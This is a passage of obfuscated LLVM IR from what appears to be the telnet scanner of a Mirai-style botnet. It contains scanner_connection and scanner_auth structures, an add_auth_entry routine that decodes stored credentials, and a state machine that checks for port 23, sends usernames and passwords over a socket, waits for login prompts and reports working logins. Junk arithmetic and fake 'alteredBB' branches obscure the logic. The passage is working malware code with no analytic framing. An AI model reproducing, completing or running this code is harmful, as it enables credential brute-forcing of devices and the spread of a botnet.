  br label %1692

; <label>:1662:                                   ; preds = %1658
  %1663 = load i32, i32* %33, align 4
  %1664 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1665 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1664, i32 0, i32 6
  %1666 = load i32, i32* %1665, align 4
  %1667 = icmp sgt i32 %1663, %1666
  br i1 %1667, label %1668, label %1672

; <label>:1668:                                   ; preds = %1662
  %1669 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1670 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1669, i32 0, i32 6
  %1671 = load i32, i32* %1670, align 4
  store i32 %1671, i32* %33, align 4
  br label %1672

; <label>:1672:                                   ; preds = %1668, %1662
  %1673 = load i32, i32* %33, align 4
  %1674 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1675 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1674, i32 0, i32 6
  %1676 = load i32, i32* %1675, align 4
  %1677 = sub nsw i32 %1676, %1673
  store i32 %1677, i32* %1675, align 4
  %1678 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1679 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1678, i32 0, i32 7
  %1680 = getelementptr inbounds [256 x i8], [256 x i8]* %1679, i32 0, i32 0
  %1681 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1682 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1681, i32 0, i32 7
  %1683 = getelementptr inbounds [256 x i8], [256 x i8]* %1682, i32 0, i32 0
  %1684 = load i32, i32* %33, align 4
  %1685 = sext i32 %1684 to i64
  %1686 = getelementptr inbounds i8, i8* %1683, i64 %1685
  %1687 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1688 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1687, i32 0, i32 6
  %1689 = load i32, i32* %1688, align 4
  %1690 = sext i32 %1689 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1680, i8* %1686, i64 %1690, i32 1, i1 false)
  br label %1691

; <label>:1691:                                   ; preds = %1672
  br label %1250

; <label>:1692:                                   ; preds = %1661
  br label %1099

; <label>:1693:                                   ; preds = %1240, %1120
  br label %1694

; <label>:1694:                                   ; preds = %1693, %1081
  br label %1695

; <label>:1695:                                   ; preds = %1694, %1053, %984
  %1696 = load i32, i32* %1, align 4
  %1697 = add nsw i32 %1696, 1
  store i32 %1697, i32* %1, align 4
  br label %972

; <label>:1698:                                   ; preds = %972
  br label %213

originalBBalteredBB:                              ; preds = %originalBB, %59
  %1699 = load i32, i32* %1, align 4
  %1700 = icmp slt i32 %1699, 256
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %106
  %1701 = load i32, i32* @rsck, align 4
  %1702 = call i32 @close(i32 %1701)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %125
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %146
  %1703 = load i16, i16* %2, align 2
  %1704 = call zeroext i16 @ntohs(i16 zeroext %1703) #7
  %1705 = zext i16 %1704 to i32
  %1706 = icmp slt i32 %1705, 1024
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %213
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %1707 = load i32, i32* @fake_time, align 4
  %1708 = load i32, i32* %10, align 4
  %1709 = icmp ne i32 %1707, %1708
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %235
  %1710 = load i32, i32* %1, align 4
  %1711 = icmp slt i32 %1710, 384
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %313
  store i32 0, i32* %9, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %359
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %376
  %1712 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1713 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1712, i32 0, i32 9
  %1714 = load i32, i32* %1713, align 4
  %1715 = load i32, i32* @LOCAL_ADDR, align 4
  %1716 = icmp ne i32 %1714, %1715
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %398
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %422
  %1717 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1718 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1717, i32 0, i32 0
  %1719 = load i16, i16* %1718, align 4
  %1720 = zext i16 %1719 to i32
  %1721 = call zeroext i16 @htons(i16 zeroext 23) #7
  %1722 = zext i16 %1721 to i32
  %1723 = icmp ne i32 %1720, %1722
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %447
  %1724 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1725 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1724, i32 0, i32 1
  %1726 = load i16, i16* %1725, align 2
  %1727 = zext i16 %1726 to i32
  %1728 = load i16, i16* %2, align 2
  %1729 = zext i16 %1728 to i32
  %1730 = icmp ne i32 %1727, %1729
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %495
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %512
  %1731 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1732 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1731, i32 0, i32 4
  %1733 = load i16, i16* %1732, align 4
  %_ = sub i16 %1733, 8
  %gen = mul i16 %_, 8
  %_51 = shl i16 %1733, 8
  %_52 = sub i16 0, %1733
  %gen53 = add i16 %_52, 8
  %_54 = shl i16 %1733, 8
  %1734 = lshr i16 %1733, 8
  %1735 = and i16 %1734, 1
  %1736 = icmp ne i16 %1735, 0
  br label %originalBB50

originalBB58alteredBB:                            ; preds = %originalBB58, %536
  %1737 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1738 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1737, i32 0, i32 3
  %1739 = load i32, i32* %1738, align 4
  %1740 = call i32 @ntohl(i32 %1739) #7
  %_59 = sub i32 %1740, 1
  %gen60 = mul i32 %_59, 1
  %_61 = sub i32 %1740, 1
  %gen62 = mul i32 %_61, 1
  %_63 = shl i32 %1740, 1
  %_64 = shl i32 %1740, 1
  %1741 = sub i32 %1740, 1
  %1742 = call i32 @htonl(i32 %1741) #7
  %1743 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1744 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1743, i32 0, i32 8
  %1745 = load i32, i32* %1744, align 4
  %1746 = icmp ne i32 %1742, %1745
  br label %originalBB58

originalBB68alteredBB:                            ; preds = %originalBB68, %569
  %1747 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1748 = load i32, i32* %18, align 4
  %1749 = sext i32 %1748 to i64
  %1750 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1747, i64 %1749
  %1751 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1750, i32 0, i32 3
  %1752 = load i32, i32* %1751, align 8
  %1753 = icmp eq i32 %1752, 0
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %593
  %1754 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1755 = load i32, i32* %18, align 4
  %1756 = sext i32 %1755 to i64
  %1757 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1754, i64 %1756
  store %struct.scanner_connection* %1757, %struct.scanner_connection** %22, align 8
  %1758 = load i32, i32* %18, align 4
  store i32 %1758, i32* %9, align 4
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %616
  %1759 = load i32, i32* %18, align 4
  %_77 = shl i32 %1759, 1
  %_78 = sub i32 0, %1759
  %gen79 = add i32 %_78, 1
  %_80 = shl i32 %1759, 1
  %_81 = shl i32 %1759, 1
  %1760 = add nsw i32 %1759, 1
  store i32 %1760, i32* %18, align 4
  br label %originalBB76

originalBB85alteredBB:                            ; preds = %originalBB85, %635
  %1761 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %1762 = icmp eq %struct.scanner_connection* %1761, null
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %668
  %1763 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %5, i32 0, i32 0
  %1764 = getelementptr inbounds [16 x i64], [16 x i64]* %1763, i64 0, i64 0
  %1765 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %1764) #6, !srcloc !1
  %1766 = extractvalue { i64, i64* } %1765, 0
  %1767 = extractvalue { i64, i64* } %1765, 1
  %1768 = trunc i64 %1766 to i32
  store i32 %1768, i32* %24, align 4
  %1769 = ptrtoint i64* %1767 to i64
  %1770 = trunc i64 %1769 to i32
  store i32 %1770, i32* %25, align 4
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %729
  %1771 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1772 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1771, i32 0, i32 1
  %1773 = load i32, i32* %1772, align 8
  %1774 = call i32 @close(i32 %1773)
  %1775 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1776 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1775, i32 0, i32 1
  store i32 -1, i32* %1776, align 8
  %1777 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1778 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1777, i32 0, i32 3
  %1779 = load i32, i32* %1778, align 8
  %1780 = icmp ugt i32 %1779, 2
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %803
  %1781 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1782 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1781, i32 0, i32 1
  %1783 = load i32, i32* %1782, align 8
  store i32 %1783, i32* %12, align 4
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %823
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %840
  %1784 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1785 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1784, i32 0, i32 3
  %1786 = load i32, i32* %1785, align 8
  %1787 = icmp ne i32 %1786, 0
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %882
  %1788 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1789 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1788, i32 0, i32 1
  %1790 = load i32, i32* %1789, align 8
  store i32 %1790, i32* %11, align 4
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %903
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %920
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %950
  %_122 = sub i32 0, 1
  %gen123 = add i32 %_122, %951
  %_124 = sub i32 0, 1
  %gen125 = add i32 %_124, %951
  %_126 = sub i32 0, 1
  %gen127 = add i32 %_126, %951
  %_128 = shl i32 1, %951
  %1791 = add nsw i32 1, %951
  %1792 = call i32 @select(i32 %1791, %struct.fd_set.18* %5, %struct.fd_set.18* %6, %struct.fd_set.18* null, %struct.timeval.19* %8)
  store i32 %1792, i32* %13, align 4
  %1793 = call i64 @time(i64* null) #6
  %1794 = trunc i64 %1793 to i32
  store i32 %1794, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %originalBB121

originalBB132alteredBB:                           ; preds = %originalBB132, %985
  %1795 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %6, i32 0, i32 0
  %1796 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1797 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1796, i32 0, i32 1
  %1798 = load i32, i32* %1797, align 8
  %_133 = sub i32 0, %1798
  %gen134 = add i32 %_133, 64
  %_135 = sub i32 %1798, 64
  %gen136 = mul i32 %_135, 64
  %_137 = shl i32 %1798, 64
  %_138 = sub i32 %1798, 64
  %gen139 = mul i32 %_138, 64
  %_140 = sub i32 0, %1798
  %gen141 = add i32 %_140, 64
  %_142 = shl i32 %1798, 64
  %_143 = shl i32 %1798, 64
  %1799 = sdiv i32 %1798, 64
  %1800 = sext i32 %1799 to i64
  %1801 = getelementptr inbounds [16 x i64], [16 x i64]* %1795, i64 0, i64 %1800
  %1802 = load i64, i64* %1801, align 8
  %1803 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1804 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1803, i32 0, i32 1
  %1805 = load i32, i32* %1804, align 8
  %1806 = srem i32 %1805, 64
  %1807 = zext i32 %1806 to i64
  %_144 = sub i64 0, 1
  %gen145 = add i64 %_144, %1807
  %_146 = sub i64 0, 1
  %gen147 = add i64 %_146, %1807
  %_148 = shl i64 1, %1807
  %_149 = sub i64 0, 1
  %gen150 = add i64 %_149, %1807
  %_151 = shl i64 1, %1807
  %_152 = sub i64 1, %1807
  %gen153 = mul i64 %_152, %1807
  %_154 = sub i64 1, %1807
  %gen155 = mul i64 %_154, %1807
  %_156 = shl i64 1, %1807
  %1808 = shl i64 1, %1807
  %_157 = sub i64 %1802, %1808
  %gen158 = mul i64 %_157, %1808
  %1809 = and i64 %1802, %1808
  %1810 = icmp ne i64 %1809, 0
  br label %originalBB132

originalBB162alteredBB:                           ; preds = %originalBB162, %1026
  %1811 = load i32, i32* %30, align 4
  %1812 = icmp eq i32 %1811, 0
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1064
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1099
  %1813 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1814 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1813, i32 0, i32 3
  %1815 = load i32, i32* %1814, align 8
  %1816 = icmp eq i32 %1815, 0
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1167
  %1817 = call i32* @__errno_location() #7
  %1818 = load i32, i32* %1817, align 4
  %1819 = icmp ne i32 %1818, 11
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1200
  %1820 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1821 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1820, i32 0, i32 8
  store i8 0, i8* %1821, align 8
  %1822 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1823 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1822, i32 0, i32 3
  store i32 0, i32* %1823, align 8
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1223
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1250
  store i32 0, i32* %33, align 4
  %1824 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1825 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1824, i32 0, i32 3
  %1826 = load i32, i32* %1825, align 8
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1274
  %1827 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1828 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1827, i32 0, i32 3
  store i32 3, i32* %1828, align 8
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1294
  %1829 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1830 = call i32 @consume_user_prompt(%struct.scanner_connection* %1829)
  store i32 %1830, i32* %33, align 4
  %1831 = icmp sgt i32 %1830, 0
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1314
  %1832 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1833 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1832, i32 0, i32 1
  %1834 = load i32, i32* %1833, align 8
  %1835 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1836 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1835, i32 0, i32 0
  %1837 = load %struct.scanner_auth*, %struct.scanner_auth** %1836, align 8
  %1838 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1837, i32 0, i32 0
  %1839 = load i8*, i8** %1838, align 8
  %1840 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1841 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1840, i32 0, i32 0
  %1842 = load %struct.scanner_auth*, %struct.scanner_auth** %1841, align 8
  %1843 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1842, i32 0, i32 4
  %1844 = load i8, i8* %1843, align 4
  %1845 = zext i8 %1844 to i64
  %1846 = call i64 @send(i32 %1834, i8* %1839, i64 %1845, i32 16384)
  %1847 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1848 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1847, i32 0, i32 1
  %1849 = load i32, i32* %1848, align 8
  %1850 = call i64 @send(i32 %1849, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %1851 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1852 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1851, i32 0, i32 3
  store i32 4, i32* %1852, align 8
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1357
  %1853 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1854 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1853, i32 0, i32 1
  %1855 = load i32, i32* %1854, align 8
  %1856 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1857 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1856, i32 0, i32 0
  %1858 = load %struct.scanner_auth*, %struct.scanner_auth** %1857, align 8
  %1859 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1858, i32 0, i32 1
  %1860 = load i8*, i8** %1859, align 8
  %1861 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1862 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1861, i32 0, i32 0
  %1863 = load %struct.scanner_auth*, %struct.scanner_auth** %1862, align 8
  %1864 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1863, i32 0, i32 5
  %1865 = load i8, i8* %1864, align 1
  %1866 = zext i8 %1865 to i64
  %1867 = call i64 @send(i32 %1855, i8* %1860, i64 %1866, i32 16384)
  %1868 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1869 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1868, i32 0, i32 1
  %1870 = load i32, i32* %1869, align 8
  %1871 = call i64 @send(i32 %1870, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %1872 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1873 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1872, i32 0, i32 3
  store i32 5, i32* %1873, align 8
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1396
  %1874 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1875 = call i32 @consume_any_prompt(%struct.scanner_connection* %1874)
  store i32 %1875, i32* %33, align 4
  %1876 = icmp sgt i32 %1875, 0
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1416
  call void @table_unlock_val(i8 zeroext 5)
  %1877 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %1877, i8** %34, align 8
  %1878 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1879 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1878, i32 0, i32 1
  %1880 = load i32, i32* %1879, align 8
  %1881 = load i8*, i8** %34, align 8
  %1882 = load i32, i32* %35, align 4
  %1883 = sext i32 %1882 to i64
  %1884 = call i64 @send(i32 %1880, i8* %1881, i64 %1883, i32 16384)
  %1885 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1886 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1885, i32 0, i32 1
  %1887 = load i32, i32* %1886, align 8
  %1888 = call i64 @send(i32 %1887, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %1889 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1890 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1889, i32 0, i32 3
  store i32 6, i32* %1890, align 8
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1447
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1483
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1586
  %1891 = load i32, i32* %33, align 4
  %1892 = icmp sgt i32 %1891, 0
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1605
  %1893 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1894 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1893, i32 0, i32 4
  %1895 = load i32, i32* %1894, align 4
  %1896 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1897 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1896, i32 0, i32 5
  %1898 = load i16, i16* %1897, align 8
  %1899 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1900 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1899, i32 0, i32 0
  %1901 = load %struct.scanner_auth*, %struct.scanner_auth** %1900, align 8
  call void @report_working(i32 %1895, i16 zeroext %1898, %struct.scanner_auth* %1901)
  %1902 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1903 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1902, i32 0, i32 1
  %1904 = load i32, i32* %1903, align 8
  %1905 = call i32 @close(i32 %1904)
  %1906 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1907 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1906, i32 0, i32 1
  store i32 -1, i32* %1907, align 8
  %1908 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1909 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1908, i32 0, i32 3
  store i32 0, i32* %1909, align 8
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1640
  br label %originalBB230
}

declare void @rand_init() #4

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = load i32, i32* @x.55
  %5 = load i32, i32* @y.56
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  store i16 %2, i16* %14, align 2
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = bitcast %struct.scanner_auth* %16 to i8*
  %18 = load i32, i32* @auth_table_len, align 4
  %19 = add nsw i32 %18, 1
  %20 = sext i32 %19 to i64
  %21 = mul i64 %20, 24
  %22 = call i8* @realloc(i8* %17, i64 %21) #6
  %23 = bitcast i8* %22 to %struct.scanner_auth*
  store %struct.scanner_auth* %23, %struct.scanner_auth** @auth_table, align 8
  %24 = load i8*, i8** %12, align 8
  %25 = call i8* @deobf(i8* %24, i32* %15)
  %26 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %27 = load i32, i32* @auth_table_len, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %26, i64 %28
  %30 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i32 0, i32 0
  store i8* %25, i8** %30, align 8
  %31 = load i32, i32* %15, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %34 = load i32, i32* @auth_table_len, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %33, i64 %35
  %37 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %36, i32 0, i32 4
  store i8 %32, i8* %37, align 4
  %38 = load i8*, i8** %13, align 8
  %39 = call i8* @deobf(i8* %38, i32* %15)
  %40 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %41 = load i32, i32* @auth_table_len, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %40, i64 %42
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %43, i32 0, i32 1
  store i8* %39, i8** %44, align 8
  %45 = load i32, i32* %15, align 4
  %46 = trunc i32 %45 to i8
  %47 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %48 = load i32, i32* @auth_table_len, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %47, i64 %49
  %51 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %50, i32 0, i32 5
  store i8 %46, i8* %51, align 1
  %52 = load i16, i16* @auth_table_max_weight, align 2
  %53 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %54 = load i32, i32* @auth_table_len, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %53, i64 %55
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 2
  store i16 %52, i16* %57, align 8
  %58 = load i16, i16* @auth_table_max_weight, align 2
  %59 = zext i16 %58 to i32
  %60 = load i16, i16* %14, align 2
  %61 = zext i16 %60 to i32
  %62 = add nsw i32 %59, %61
  %63 = trunc i32 %62 to i16
  %64 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %65 = load i32, i32* @auth_table_len, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* @auth_table_len, align 4
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %64, i64 %67
  %69 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %68, i32 0, i32 3
  store i16 %63, i16* %69, align 2
  %70 = load i16, i16* %14, align 2
  %71 = zext i16 %70 to i32
  %72 = load i16, i16* @auth_table_max_weight, align 2
  %73 = zext i16 %72 to i32
  %74 = add nsw i32 %73, %71
  %75 = trunc i32 %74 to i16
  store i16 %75, i16* @auth_table_max_weight, align 2
  %76 = load i32, i32* @x.55
  %77 = load i32, i32* @y.56
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %84 = alloca i8*, align 8
  %85 = alloca i8*, align 8
  %86 = alloca i16, align 2
  %87 = alloca i32, align 4
  store i8* %0, i8** %84, align 8
  store i8* %1, i8** %85, align 8
  store i16 %2, i16* %86, align 2
  %88 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %89 = bitcast %struct.scanner_auth* %88 to i8*
  %90 = load i32, i32* @auth_table_len, align 4
  %_ = sub i32 0, %90
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %90
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 0, %90
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 %90, 1
  %gen6 = mul i32 %_5, 1
  %_7 = shl i32 %90, 1
  %_8 = shl i32 %90, 1
  %91 = add nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %_9 = sub i64 0, %92
  %gen10 = add i64 %_9, 24
  %_11 = shl i64 %92, 24
  %_12 = sub i64 0, %92
  %gen13 = add i64 %_12, 24
  %_14 = sub i64 %92, 24
  %gen15 = mul i64 %_14, 24
  %_16 = sub i64 0, %92
  %gen17 = add i64 %_16, 24
  %_18 = sub i64 %92, 24
  %gen19 = mul i64 %_18, 24
  %_20 = sub i64 0, %92
  %gen21 = add i64 %_20, 24
  %93 = mul i64 %92, 24
  %94 = call i8* @realloc(i8* %89, i64 %93) #6
  %95 = bitcast i8* %94 to %struct.scanner_auth*
  store %struct.scanner_auth* %95, %struct.scanner_auth** @auth_table, align 8
  %96 = load i8*, i8** %84, align 8
  %97 = call i8* @deobf(i8* %96, i32* %87)
  %98 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %99 = load i32, i32* @auth_table_len, align 4
